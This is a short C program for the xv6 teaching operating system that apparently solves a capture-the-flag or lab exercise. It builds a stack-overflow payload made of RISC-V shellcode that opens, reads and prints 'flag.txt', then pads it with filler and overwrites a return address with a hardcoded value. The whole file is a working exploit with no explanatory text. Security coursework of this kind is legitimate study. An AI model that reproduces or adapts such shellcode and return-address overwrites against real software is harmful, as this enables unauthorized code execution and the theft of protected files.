#include "kernel/types.h"
#include "user/user.h"

char exp[0x1000];

char shellcode[] = {0x17, 0x05, 0x00, 0x00, 0x13, 0x05, 0x85, 0x03, 0x93, 0x05,
                    0x00, 0x00, 0x93, 0x08, 0xf0, 0x00, 0x73, 0x00, 0x00, 0x00,
                    0x93, 0x05, 0x01, 0x00, 0x13, 0x06, 0x00, 0x08, 0x93, 0x08,
                    0x50, 0x00, 0x73, 0x00, 0x00, 0x00, 0x13, 0x05, 0x10, 0x00,
                    0x93, 0x05, 0x01, 0x00, 0x13, 0x06, 0x00, 0x08, 0x93, 0x08,
                    0x00, 0x01, 0x73, 0x00, 0x00, 0x00, 0x66, 0x6c, 0x61, 0x67,
                    0x2e, 0x74, 0x78, 0x74, 0x00, 0x00, 0x01, 0x00};

int main() {
  for (int i = 0; i < 144; i++) {
    exp[i] = 'B';
  }
  memmove(exp, shellcode, sizeof(shellcode));
  void *target_pc = (void *)0x3f30;
  *(void **)(exp + 136) = target_pc;
  write(1, exp, 144);
  printf("\n");
  exit(0);
}
